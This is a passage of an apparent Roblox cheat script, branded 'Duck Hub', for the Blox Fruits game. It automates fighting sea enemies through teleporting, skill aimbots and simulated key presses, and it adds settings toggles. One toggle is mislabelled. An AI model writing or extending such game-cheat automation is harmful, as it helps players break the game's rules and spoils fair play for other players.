						game:GetService("VirtualInputManager"):SendKeyEvent(false, 32, false, game)
					end
				end
			end
		end
	end)
end)

spawn(function()
	while wait() do
		pcall(function()
			if _G.SailBoat then
				if game:GetService("Workspace").Enemies:FindFirstChild("Fish Crew Member") and _G.AutoKillFishCrew then
					for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
						if game:GetService("Workspace").Enemies:FindFirstChild("Fish Crew Member") then
							if v.Name == "Fish Crew Member" then
								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
									repeat task.wait()
										AutoHaki()
										EquipWeapon(_G.SelectWeapon)
										TP2(v.HumanoidRootPart.CFrame * Pos)
										NeedAttacking = true
										_G.SeaSkill = false
									until not _G.AutoKillFishCrew or not v.Parent or v.Humanoid.Health <= 0
									StartMagnet = false
								end
							end
						end
					end
				elseif game:GetService("Workspace").Enemies:FindFirstChild("FishBoat") and _G.RelzFishBoat then
					for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
						if game:GetService("Workspace").Enemies:FindFirstChild("FishBoat") then
							repeat task.wait()
								local BoatCFrame = v.Engine.CFrame
								if (BoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
									_G.SeaSkill = true
								else
									_G.SeaSkill = false
								end
								TP2(BoatCFrame)
								Skillaimbot = true
								AimSkill = v.Engine.CFrame * CFrame.new(0, -15, 0)
								AimBotSkillPosition = AimSkill.Position
							until not v.Parent or v.Health < 0 or not game:GetService("Workspace").Enemies:FindFirstChild("FishBoat") or not v:FindFirstChild("Engine") or not _G.RelzFishBoat
							Skillaimbot = false
							_G.SeaSkill = false
						end
					end
				elseif game:GetService("Workspace").Enemies:FindFirstChild("PirateGrandBrigade") and _G.RelzPirateGrandBrigade then
					for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
						if game:GetService("Workspace").Enemies:FindFirstChild("PirateGrandBrigade") then
							repeat task.wait()
								local BoatCFrame = v.Engine.CFrame
								if (BoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
									_G.SeaSkill = true
								else
									_G.SeaSkill = false
								end
								TP2(BoatCFrame)
								Skillaimbot = true
								AimSkill = v.Engine.CFrame * CFrame.new(0, -15, 0)
								AimBotSkillPosition = AimSkill.Position
							until not v.Parent or v.Health.Value < 0 or not game:GetService("Workspace").Enemies:FindFirstChild("PirateGrandBrigade") or not v:FindFirstChild("Engine") or not _G.RelzPirateGrandBrigade
							Skillaimbot = false
							_G.SeaSkill = false
						end
					end
				elseif game:GetService("Workspace").Enemies:FindFirstChild("PirateBrigade") and _G.RelzPirateBrigade then
					for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
						if game:GetService("Workspace").Enemies:FindFirstChild("PirateBrigade") then
							repeat task.wait()
								local BoatCFrame = v.Engine.CFrame
								if (BoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
									_G.SeaSkill = true
								else
									_G.SeaSkill = false
								end
								TP2(BoatCFrame)
								Skillaimbot = true
								AimSkill = v.Engine.CFrame * CFrame.new(0, -15, 0)
								AimBotSkillPosition = AimSkill.Position
							until not v.Parent or v.Health.Value < 0 or not game:GetService("Workspace").Enemies:FindFirstChild("PirateBrigade") or not v:FindFirstChild("Engine") or not _G.RelzPirateBrigade
							Skillaimbot = false
							_G.SeaSkill = false
						end
					end
				elseif CheckSeaBeast() and _G.AutoSeaBest then
					if game:GetService("Workspace"):FindFirstChild("SeaBeasts") then
						for i,v in pairs(game:GetService("Workspace").SeaBeasts:GetChildren()) do
							if CheckSeaBeast() then
								repeat wait()
									CFrameSeaBeast = v.HumanoidRootPart.CFrame * CFrame.new(0,200,0)
									if (CFrameSeaBeast.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude <= 200 then
										_G.SeaSkill = true
									else
										_G.SeaSkill = false
									end
									Skillaimbot = true
									AimBotSkillPosition = v.HumanoidRootPart.CFrame.Position
									TP2(CFrameSeaBeast * Pos)
								until not _G.AutoSeaBest or CheckSeaBeast() == false or not v:FindFirstChild("Humanoid") or not v:FindFirstChild("HumanoidRootPart") or v.Humanoid.Health < 0 or not v.Parent
								Skillaimbot = false
								_G.SeaSkill = false
							else
								Skillaimbot = false
								_G.SeaSkill = false
							end
						end
					end
				elseif game:GetService("Workspace").Enemies:FindFirstChild("Terrorshark") and _G.AutoTerrorshark then
					for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
						if game:GetService("Workspace").Enemies:FindFirstChild("Terrorshark") then
							if v.Name == "Terrorshark" then
								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
									repeat task.wait(0.15)
										AutoHaki()
										EquipWeapon(_G.SelectWeapon)
										NeedAttacking = true
										_G.SeaSkill = false
										TP2(v.HumanoidRootPart.CFrame * CFrame.new(0, 60, 0))
									until not  _G.AutoTerrorshark or not v.Parent or v.Humanoid.Health <= 0
								end
							end
						end
					end
				elseif CheckPiranha() and _G.AutoKillPiranha then
					for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
						if game:GetService("Workspace").Enemies:FindFirstChild("Piranha") then
							if v.Name == "Piranha" then
								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
									repeat task.wait()
										AutoHaki()
										EquipWeapon(_G.SelectWeapon)
										TP2(v.HumanoidRootPart.CFrame * Pos)
										NeedAttacking = true
										_G.SeaSkill = false
									until not _G.AutoKillPiranha or not v.Parent or v.Humanoid.Health <= 0
								end
							end
						end
					end
				elseif CheckShark() and _G.AutoKillShark then
					for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
						if game:GetService("Workspace").Enemies:FindFirstChild("Shark") then
							if v.Name == "Shark" then
								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
									repeat task.wait()
										AutoHaki()
										EquipWeapon(_G.SelectWeapon)
										TP2(v.HumanoidRootPart.CFrame * Pos)
										NeedAttacking = true
										_G.SeaSkill = false
									until not _G.AutoKillShark or not v.Parent or v.Humanoid.Health <= 0
								end
							end
						end
					end
				else
					Skillaimbot = false
					_G.SeaSkill = false
					UnEquipWeapon(_G.SelectWeapon)
				end
			end
		end)
	end
end)
local toggleshark = Tabs.Se:AddToggle("toggleshark", {Title = "Auto Kill Shark",Description = "Enable for kill normal shark if have", Default = _G.AutoKillShark })
toggleshark:OnChanged(function(value)
	_G.AutoKillShark = value
	saveSettings()
end)
local piranhatoggle = Tabs.Se:AddToggle("piranhatoggle", {Title = "Auto Kill Piranha",Description = "Enable for kill Piranha if have", Default = _G.AutoKillPiranha })
piranhatoggle:OnChanged(function(value)
	_G.AutoKillPiranha = value
	saveSettings()
end)
local fishcrew = Tabs.Se:AddToggle("fishcrew", {Title = "Auto Kill Piranha",Description = "Enable for kill Crew Fish if have", Default = _G.AutoKillFishCrew })
fishcrew:OnChanged(function(value)
	_G.AutoKillFishCrew = value
	saveSettings()
end)

repeat
    wait()
until game:IsLoaded()
if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end
game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Duck Hub",
        Icon = "rbxthumb://type=GamePass&id=944258394&w=150&h=150",
        Text = "Đã Tải Xong",
        Duration = 1
    })
       
